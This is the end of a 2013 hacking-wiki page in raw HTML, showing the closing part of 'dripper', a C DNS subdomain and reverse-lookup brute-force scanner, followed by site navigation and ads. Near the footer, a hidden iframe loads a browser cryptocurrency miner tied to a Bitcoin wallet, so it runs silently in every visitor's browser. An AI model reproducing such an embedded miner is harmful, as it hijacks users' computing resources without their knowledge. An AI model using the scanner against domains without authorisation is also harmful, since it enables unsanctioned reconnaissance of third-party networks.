    <span class="co1">// receive from port 0 (or sniff all incoming UDP packets)</span>
    <span class="kw1">if</span><span class="br0">&#40;</span><span class="br0">&#40;</span>len_pkt <span class="sy0">=</span> recvfrom<span class="br0">&#40;</span>sniffer<span class="sy0">,</span> buffer<span class="sy0">,</span> <span class="nu0">65536</span><span class="sy0">,</span> <span class="nu0">0</span><span class="sy0">,</span> <span class="sy0">&amp;</span>saddr<span class="sy0">,</span> <span class="sy0">&amp;</span>sockaddr_size<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">&lt;</span> <span class="nu0">1</span><span class="br0">&#41;</span>
      <span class="kw1">continue</span><span class="sy0">;</span>
    <span class="co1">// parse UDP packets</span>
    parse_dns_reply<span class="br0">&#40;</span>buffer<span class="sy0">,</span> len_pkt<span class="sy0">,</span> domain<span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
<span class="br0">&#125;</span>
&#160;
<span class="co1">// print usage and exit</span>
<span class="co1">// arguments:</span>
<span class="co1">//   void</span>
<span class="kw4">void</span> usage<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  fprintf<span class="br0">&#40;</span>stderr<span class="sy0">,</span> <span class="st0">&quot;dripper usage:<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  fprintf<span class="br0">&#40;</span>stderr<span class="sy0">,</span> <span class="st0">&quot; * -h                     -- display this message.<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  fprintf<span class="br0">&#40;</span>stderr<span class="sy0">,</span> <span class="st0">&quot; * -r &lt;resolv conf&gt;       -- resolv.conf (list of nameservers).<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  fprintf<span class="br0">&#40;</span>stderr<span class="sy0">,</span> <span class="st0">&quot; * -s &lt;subdomain list&gt;    -- subdomain list (list of subdomains).<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  fprintf<span class="br0">&#40;</span>stderr<span class="sy0">,</span> <span class="st0">&quot; * -d &lt;domain to brute&gt;   -- target domain (e.g. google.com).<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  fprintf<span class="br0">&#40;</span>stderr<span class="sy0">,</span> <span class="st0">&quot; * -i &lt;ip range to brute&gt; -- IP range to bruteforce for a target domain.<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  exit<span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&#160;
<span class="kw4">int</span> main<span class="br0">&#40;</span><span class="kw4">int</span> argc<span class="sy0">,</span> <span class="kw4">char</span> <span class="sy0">*</span>argv<span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>range<span class="sy0">=</span>NULL<span class="sy0">,</span> <span class="sy0">*</span>domain<span class="sy0">=</span>NULL<span class="sy0">,</span> opt<span class="sy0">;</span>
  srand<span class="br0">&#40;</span>time<span class="br0">&#40;</span>NULL<span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  fprintf<span class="br0">&#40;</span>stderr<span class="sy0">,</span> <span class="st0">&quot;---------------------------------<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  fprintf<span class="br0">&#40;</span>stderr<span class="sy0">,</span> <span class="st0">&quot;dripper Stateless DNS Scanner 1.0<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  fprintf<span class="br0">&#40;</span>stderr<span class="sy0">,</span> <span class="st0">&quot;  (c) jtripper 2013<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  fprintf<span class="br0">&#40;</span>stderr<span class="sy0">,</span> <span class="st0">&quot;  http://blackhatlibrary.net/<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  fprintf<span class="br0">&#40;</span>stderr<span class="sy0">,</span> <span class="st0">&quot;---------------------------------<span class="es1">\n</span><span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="kw1">if</span><span class="br0">&#40;</span>argc <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">&#41;</span>
    usage<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// get options</span>
  <span class="kw1">while</span><span class="br0">&#40;</span><span class="br0">&#40;</span>opt <span class="sy0">=</span> getopt<span class="br0">&#40;</span>argc<span class="sy0">,</span> argv<span class="sy0">,</span> <span class="st0">&quot;hr:s:d:i:&quot;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">!=</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">switch</span><span class="br0">&#40;</span>opt<span class="br0">&#41;</span> <span class="br0">&#123;</span>
      <span class="co1">// override default resolvconf</span>
      <span class="kw1">case</span> <span class="st0">'r'</span><span class="sy0">:</span>
        RESOLVCONF <span class="sy0">=</span> optarg<span class="sy0">;</span>
        <span class="kw2">break</span><span class="sy0">;</span>
      <span class="co1">// override default subdomain file</span>
      <span class="kw1">case</span> <span class="st0">'s'</span><span class="sy0">:</span>
        SUBDOMAINS <span class="sy0">=</span> optarg<span class="sy0">;</span>
        <span class="kw2">break</span><span class="sy0">;</span>
      <span class="co1">// set the domain</span>
      <span class="kw1">case</span> <span class="st0">'d'</span><span class="sy0">:</span>
        domain <span class="sy0">=</span> optarg<span class="sy0">;</span>
        <span class="kw2">break</span><span class="sy0">;</span>
      <span class="co1">// set the IP range (if doing reverse scan)</span>
      <span class="kw1">case</span> <span class="st0">'i'</span><span class="sy0">:</span>
        range <span class="sy0">=</span> optarg<span class="sy0">;</span>
        <span class="kw2">break</span><span class="sy0">;</span>
      <span class="kw1">default</span><span class="sy0">:</span>
        usage<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
  <span class="br0">&#125;</span>
&#160;
  <span class="co1">// make sure a domain is set</span>
  <span class="kw1">if</span><span class="br0">&#40;</span><span class="sy0">!</span>domain<span class="br0">&#41;</span> usage<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// retreive name servers</span>
  parse_resolv_conf<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="co1">// make sure subdomains file exists</span>
  <span class="kw1">if</span><span class="br0">&#40;</span><span class="sy0">!</span>fopen<span class="br0">&#40;</span>SUBDOMAINS<span class="sy0">,</span> <span class="st0">&quot;r&quot;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> error<span class="br0">&#40;</span><span class="st0">&quot;[!] Error opening:&#160;%s&quot;</span><span class="sy0">,</span> SUBDOMAINS<span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="kw1">if</span><span class="br0">&#40;</span><span class="sy0">!</span>fork<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="co1">// do a reverse search or a forward search</span>
    <span class="kw1">if</span><span class="br0">&#40;</span>range<span class="br0">&#41;</span> <span class="br0">&#123;</span>
      reverse_search<span class="br0">&#40;</span>range<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span> <span class="kw1">else</span> <span class="br0">&#123;</span>
      forward_brute<span class="br0">&#40;</span>domain<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
  <span class="br0">&#125;</span> <span class="kw1">else</span> <span class="br0">&#123;</span>
    <span class="co1">// spawn the sniffer</span>
    sniff_dns_replies<span class="br0">&#40;</span>domain<span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
<span class="br0">&#125;</span></pre></div></div>
</td></tr></table>

<!-- 
NewPP limit report
Preprocessor node count: 9/1000000
Post-expand include size: 82/2097152 bytes
Template argument size: 42/2097152 bytes
Expensive parser function count: 0/100
-->
<div class="printfooter">
Retrieved from "<a href="http://www.blackhatlibrary.net/Dripper.c">http://www.blackhatlibrary.net/Dripper.c</a>"</div>
		<div id='catlinks' class='catlinks catlinks-allhidden'></div>		<!-- end content -->
				<div class="visualClear"></div>
	</div>
</div></div>
<div id="column-one">
	<div id="p-cactions" class="portlet">
		<h5>Views</h5>
		<div class="pBody">
			<ul>
				 <li id="ca-nstab-main" class="selected"><a href="/Dripper.c" title="View the content page [c]" accesskey="c">Page</a></li>
				 <li id="ca-talk" class="new"><a href="/index.php?title=Talk:Dripper.c&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
				 <li id="ca-viewsource"><a href="/index.php?title=Dripper.c&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
				 <li id="ca-history"><a href="/index.php?title=Dripper.c&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
			</ul>
		</div>
	</div>
	<div class="portlet" id="p-personal">
		<h5>Personal tools</h5>
		<div class="pBody">
			<ul>
				<li id="pt-login"><a href="/index.php?title=Special:UserLogin&amp;returnto=Dripper.c" title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o">Log in</a></li>
			</ul>
		</div>
	</div>
	<div class="portlet" id="p-logo">
		<a style="background-image: url(/logo.png);" href="/Main_Page" title="Visit the main page"></a>
	</div>
	<script type="text/javascript"> if (window.isMSIE55) fixalpha(); </script>
	<div class='generated-sidebar portlet' id='p-Wiki'>
		<h5>Wiki</h5>
		<div class='pBody'>
			<ul>
				<li id="n-mainpage-description"><a href="/Main_Page" title="Visit the main page [z]" accesskey="z">Main page</a></li>
				<li id="n-The-index"><a href="/Category:Indexing">The index</a></li>
				<li id="n-Donate"><a href="/Donations">Donate</a></li>
				<li id="n-Contribute"><a href="/Category:Requested_maintenance">Contribute</a></li>
				<li id="n-recentchanges"><a href="/Special:RecentChanges" title="The list of recent changes in the wiki [r]" accesskey="r">Recent changes</a></li>
				<li id="n-randompage"><a href="/Special:Random" title="Load a random page [x]" accesskey="x">Random page</a></li>
			</ul>
		</div>
	</div>
	<div class='generated-sidebar portlet' id='p-Community'>
		<h5>Community</h5>
		<div class='pBody'>
			<ul>
				<li id="n-Chokepoint"><a href="http://www.chokepoint.net">Chokepoint</a></li>
				<li id="n-.2Fr.2Fblackhat"><a href="http://reddit.com/r/blackhat">/r/blackhat</a></li>
				<li id="n-.40BlackhatStaff"><a href="http://twitter.com/BlackhatStaff">@BlackhatStaff</a></li>
			</ul>
		</div>
	</div>
	<div id="p-search" class="portlet">
		<h5><label for="searchInput">Search</label></h5>
		<div id="searchBody" class="pBody">
			<form action="/index.php" id="searchform">
				<input type='hidden' name="title" value="Special:Search"/>
				<input id="searchInput" title="Search Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools" accesskey="f" type="search" name="search" />
				<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Go" title="Go to a page with this exact name if exists" />&#160;
				<input type='submit' name="fulltext" class="searchButton" id="mw-searchButton" value="Search" title="Search the pages for this text" />
			</form>
		</div>
	</div>
	<div class="portlet" id="p-tb">
		<h5>Toolbox</h5>
		<div class="pBody">
			<ul>
				<li id="t-whatlinkshere"><a href="/Special:WhatLinksHere/Dripper.c" title="List of all wiki pages that link here [j]" accesskey="j">What links here</a></li>
				<li id="t-recentchangeslinked"><a href="/Special:RecentChangesLinked/Dripper.c" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
<li id="t-specialpages"><a href="/Special:SpecialPages" title="List of all special pages [q]" accesskey="q">Special pages</a></li>
				<li id="t-print"><a href="/index.php?title=Dripper.c&amp;printable=yes" rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable version</a></li>				<li id="t-permalink"><a href="/index.php?title=Dripper.c&amp;oldid=25861" title="Permanent link to this revision of the page">Permanent link</a></li>			</ul>
		</div>
	</div>
&nbsp;

<script type="text/javascript"><!--
google_ad_client = "ca-pub-3100048614381705";
/* BHL Sidebar */
google_ad_slot = "2730381272";
google_ad_width = 120;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>

<a href="http://www.srsvps.com/"><center><img src="http://blackhatlibrary.net/images/srsvps-button-tux.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
<a href="http://vps-heaven.com/"><center><img src="http://blackhatlibrary.net/images/vps-heaven.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
<center>VPS-Heaven now accepting BitCoin!</center><br />
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-40369725-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>
<a href="http://www.soldierx.com/"><center><img src="http://www.soldierx.com/system/files/images/sx-mini-1.jpg" style="padding: 2px,0px,2px,0px;"></center></a>
<br /><br /><center>Our research is made possible by your support.</center><br />
<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
<input type="hidden" name="cmd" value="_s-xclick">
<input type="hidden" name="hosted_button_id" value="74Q9CEK92HZCL">
<input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
<img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1">
</form>
</div><!-- end of the left (by default at least) column -->
<div class="visualClear"></div>
<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 1Lr99MtUNbUVSpU6MFA3CboYWGgZ8pHWdB</script></iframe>
<div id="footer">
	<div id="f-poweredbyico">
		<a href="http://www.mediawiki.org/"><img src="/skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
	</div>
	<ul id="f-list">
		<li id="lastmod"> This page was last modified on 5 September 2013, at 14:35.</li>
		<li id="viewcount">This page has been accessed 2,510 times.</li>
		<li id="privacy"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:Privacy_policy" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:Privacy policy">Privacy policy</a></li>
		<li id="about"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:About" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:About">About Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</a></li>
		<li id="disclaimer"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:General_disclaimer" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:General disclaimer">Disclaimers</a></li>
<div align="center"><a href="http://www.darkexile.com/forums/index.php?action=affiliates;sa=in;idaff=15"><img src="http://www.darkexile.com/forums/gallery/3_20_01_11_10_02_44.png"></a>&nbsp; <a href="http://hacktalk.net/"><img src="hacktalk.png"></a></div>

	</ul>
</div>
</div>

<script src="/load.php?debug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=monobook&amp;*"></script>
<script>if ( window.mediaWiki ) {
	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Dripper.c", "wgTitle": "Dripper.c", "wgAction": "view", "wgArticleId": 15565, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 25861, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
}
</script>
<script>if ( window.mediaWiki ) {
	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
	mediaWiki.loader.go();
}
</script>

<script type="text/javascript"> 
function toggleDisplay( id, hidetext, showtext )
{
  link = document.getElementById( id + "l" ).childNodes[0];
 
  with( document.getElementById( id ).style )
    {
      if( display == "none" )
	{
	  display = "inline";
	  link.nodeValue = hidetext;
	}
      else
	{
	  display = "none";
	  link.nodeValue = showtext;
	}
    }
}
</script>
<script>if ( window.mediaWiki ) {
	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"monobook","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"en","language":"en","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
}
</script><!-- Served in 2.400 secs. --></body></html>
